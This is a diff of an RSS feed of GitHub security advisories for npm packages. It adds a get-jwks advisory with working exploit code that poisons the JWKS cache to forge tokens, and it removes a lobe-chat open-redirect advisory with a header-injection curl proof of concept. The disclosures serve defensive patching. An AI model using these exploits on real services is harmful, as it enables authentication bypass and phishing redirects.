@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2025-09-26T14:11:51.029Z</updated>
+    <updated>2025-09-26T14:31:35.270Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,147 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[get-jwks] get-jwks: poisoned JWKS cache allows post-fetch issuer validation bypass]]></title>
+        <id>https://github.com/advisories/GHSA-qc2q-qhf3-235m</id>
+        <link href="https://github.com/advisories/GHSA-qc2q-qhf3-235m"/>
+        <updated>2025-09-26T14:27:02.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A vulnerability in <code>get-jwks</code> can lead to cache poisoning in the JWKS key-fetching mechanism. </p>
+<h3 id="details">Details</h3>
+<p>When the <code>iss</code> (issuer) claim is validated only after keys are retrieved from the cache, it is possible for cached keys from an unexpected issuer to be reused, resulting in a bypass of issuer validation. This design flaw enables a potential attack where a malicious actor crafts a pair of JWTs, the first one ensuring that a chosen public key is fetched and stored in the shared JWKS cache, and the second one leveraging that cached key to pass signature validation for a targeted <code>iss</code> value.</p>
+<p>The vulnerability will work only if the <code>iss</code> validation is done after the use of <code>get-jwks</code> for keys retrieval, which usually is the common case. </p>
+<h3 id="poc">PoC</h3>
+<p>Server code:</p>
+<pre><code class="language-js">const express = require('express')
+const buildJwks = require('get-jwks')
+const { createVerifier } = require('fast-jwt')
+
+const jwks = buildJwks({ providerDiscovery: true });
+const keyFetcher = async (jwt) =&gt;
+    jwks.getPublicKey({
+        kid: jwt.header.kid,
+        alg: jwt.header.alg,
+        domain: jwt.payload.iss
+    });
+
+const jwtVerifier = createVerifier({
+    key: keyFetcher,
+    allowedIss: 'https://example.com',
+});
+
+const app = express();
+const port = 3000;
+
+app.use(express.json());
+
+async function verifyToken(req, res, next) {
+  const headerAuth = req.headers.authorization.split(' ')
+  let token = '';
+  if (headerAuth.length &gt; 1) {
+    token = headerAuth[1];
+  }
+
+  const payload = await jwtVerifier(token);
+
+  req.decoded = payload;
+  next();
+}
+
+// Endpoint to check if you are auth or not
+app.get('/auth', verifyToken, (req, res) =&gt; {
+  res.json(req.decoded);
+});
+
+app.listen(port, () =&gt; {
+  console.log(`Server is running on port ${port}`);
+});
+</code></pre>
+<p>Exploit server that generates the JWT pair and send the public RSA key to the victim server:</p>
+<pre><code class="language-js">const { generateKeyPairSync } = require('crypto');
+const express = require('express');
+const pem2jwk = require('pem2jwk');
+const jwt = require('jsonwebtoken');
+
+const app = express();
+const port = 3001;
+const host = `http://localhost:${port}`;
+const target_iss = `https://example.com`;
+
+const { publicKey, privateKey } = generateKeyPairSync("rsa",
+    {   modulusLength: 4096,
+        publicKeyEncoding: { type: 'pkcs1', format: 'pem' },
+        privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
+    },
+);
+const jwk = pem2jwk(publicKey);
+
+app.use(express.json());
+
+// Endpoint to create cache poisoning token
+app.post('/create-token-1', (req, res) =&gt; {
+  const token = jwt.sign({ ...req.body, iss: `${host}/?:${target_iss}`,  }, privateKey, { 
+    algorithm: 'RS256', 
+    header: {
+        kid: "testkid", 
+     } });
+  res.send(token);
+});
+
+// Endpoint to create a token with valid iss
+app.post('/create-token-2', (req, res) =&gt; {
+    const token = jwt.sign({ ...req.body, iss: target_iss ,  }, privateKey, { algorithm: 'RS256', header: {
+      kid: `testkid:${host}/?`, 
+    } });
+    res.send(token);
+  });
+
+app.get('/.well-known/jwks.json', (req, res) =&gt; {
+    return res.json({
+        keys: [{
+            ...jwk,
+            kid: 'testkid',
+            alg: 'RS256',
+            use: 'sig',
+        }]
+    });
+})
+
+app.use((req, res) =&gt; {
+    return res.json({
+        "issuer": host,
+        "jwks_uri": host + '/.well-known/jwks.json'
+    });
+});
+
+app.listen(port, () =&gt; {
+  console.log(`Server is running on port ${port}`);
+});
+</code></pre>
+<p>The first JWT token will create a cache entry with the chosen public key and have the following format:</p>
+<p><code>RS256:testkid:http://localhost:3001/?:https://example.com</code></p>
+<p>The second JWT has a valid <code>iss</code>, but will create the exact same cache key as the one before, leading to signature validation with the chosen public key, bypassing any future <code>iss</code> validations:</p>
+<p><code>RS256:testkid:http://localhost:3001/?:https://example.com</code></p>
+<h3 id="impact">Impact</h3>
+<p>Applications relying on <code>get-jwks</code> for key retrieval, even with <code>iss</code> validation post-fetching, allows attackers to sign arbitrary payloads which will be accepted by the verifiers used. </p>
+<h3 id="solution">Solution</h3>
+<p>Escape each component used in the cache key, so delimiter collisions are impossible.</p>
+<p><a href="https://github.com/nearform/get-jwks/blob/57801368adf391a32040854863d81748d8ff97ed/src/get-jwks.js#L76">https://github.com/nearform/get-jwks/blob/57801368adf391a32040854863d81748d8ff97ed/src/get-jwks.js#L76</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nearform/get-jwks/security/advisories/GHSA-qc2q-qhf3-235m">https://github.com/nearform/get-jwks/security/advisories/GHSA-qc2q-qhf3-235m</a></li>
+<li><a href="https://github.com/nearform/get-jwks/commit/1706a177a80a1759fe68e3339dc5a219ce03ddb9">https://github.com/nearform/get-jwks/commit/1706a177a80a1759fe68e3339dc5a219ce03ddb9</a></li>
+<li><a href="https://github.com/advisories/GHSA-qc2q-qhf3-235m">https://github.com/advisories/GHSA-qc2q-qhf3-235m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qc2q-qhf3-235m</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-09-26T14:27:01.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[dref] dref is vulnerable to prototype pollution]]></title>
         <id>https://github.com/advisories/GHSA-76g8-235f-gj6p</id>
@@ -436,71 +577,5 @@
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2025-09-25T00:30:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@lobehub/chat] lobe-chat has an Open Redirect]]></title>
-        <id>https://github.com/advisories/GHSA-xph5-278p-26qx</id>
-        <link href="https://github.com/advisories/GHSA-xph5-278p-26qx"/>
-        <updated>2025-09-24T21:34:11.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description"><strong>Description</strong></h3>
-<hr>
-<blockquote>
-<p>Vulnerability Overview</p>
-</blockquote>
-<p>The project's OIDC redirect handling logic constructs the host and protocol of the final redirect URL based on the X-Forwarded-Host or Host headers and the X-Forwarded-Proto value. In deployments where a reverse proxy forwards client-supplied X-Forwarded-* headers to the origin as-is, or where the origin trusts them without validation, an attacker can inject an arbitrary host and trigger an open redirect that sends users to a malicious domain.</p>
-<blockquote>
-<p>Vulnerable Code Analysis</p>
-</blockquote>
-<pre><code class="language-bash">const internalRedirectUrlString = await oidcService.getInteractionResult(uid, result);
-log('OIDC Provider internal redirect URL string: %s', internalRedirectUrlString);
-
-let finalRedirectUrl;
-try {
-  finalRedirectUrl = correctOIDCUrl(request, new URL(internalRedirectUrlString));
-} catch {
-  finalRedirectUrl = new URL(internalRedirectUrlString);
-  log('Warning: Could not parse redirect URL, using as-is: %s', internalRedirectUrlString);
-}
-
-return NextResponse.redirect(finalRedirectUrl, {
-  headers: request.headers,
-  status: 303,
-});
-</code></pre>
-<p><a href="https://github.com/lobehub/lobe-chat/blob/aa841a3879c30142720485182ad62aa0dbd74edc/src/app/(backend)/oidc/consent/route.ts#L113-L127">https://github.com/lobehub/lobe-chat/blob/aa841a3879c30142720485182ad62aa0dbd74edc/src/app/(backend)/oidc/consent/route.ts#L113-L127</a></p>
-<h3 id="poc">PoC</h3>
-<hr>
-<blockquote>
-<p>curl Example</p>
-</blockquote>
-<pre><code class="language-bash">curl -i 'http://localhost:3210/oidc/callback/desktop?code=abc&amp;state=test123' \
-  -H 'X-Forwarded-Host: google.com' \
-  -H 'X-Forwarded-Proto: https'
-</code></pre>
-<img src="https://github.com/user-attachments/assets/b71d937d-7be2-49db-8f3d-e07371912800" alt="image" height="304" width="1504">
-
-
-<h3 id="impact">Impact</h3>
-<hr>
-<ul>
-<li>It can force users to redirect to untrusted external domains, leading to subsequent attacks such as phishing, credential harvesting, and session fixation.</li>
-<li>It can disrupt the OAuth/OIDC flow user experience by redirecting users to malicious domains disguised as legitimate pages (even though this path doesn't directly include tokens, it can be exploited for social engineering attacks through redirect chains).</li>
-<li>The impact can be amplified when redirect chains are combined with other vulnerabilities such as CSP bypass or cache poisoning.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lobehub/lobe-chat/security/advisories/GHSA-xph5-278p-26qx">https://github.com/lobehub/lobe-chat/security/advisories/GHSA-xph5-278p-26qx</a></li>
-<li><a href="https://github.com/lobehub/lobe-chat/commit/70f52a3c1fadbd41a9db0e699d1e44d9965de445">https://github.com/lobehub/lobe-chat/commit/70f52a3c1fadbd41a9db0e699d1e44d9965de445</a></li>
-<li><a href="https://github.com/lobehub/lobe-chat/blob/aa841a3879c30142720485182ad62aa0dbd74edc/src/app/(backend)/oidc/consent/route.ts#L113-L127">https://github.com/lobehub/lobe-chat/blob/aa841a3879c30142720485182ad62aa0dbd74edc/src/app/(backend)/oidc/consent/route.ts#L113-L127</a></li>
-<li><a href="https://github.com/advisories/GHSA-xph5-278p-26qx">https://github.com/advisories/GHSA-xph5-278p-26qx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xph5-278p-26qx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-09-24T21:34:10.000Z</published>
     </entry>
 </feed>
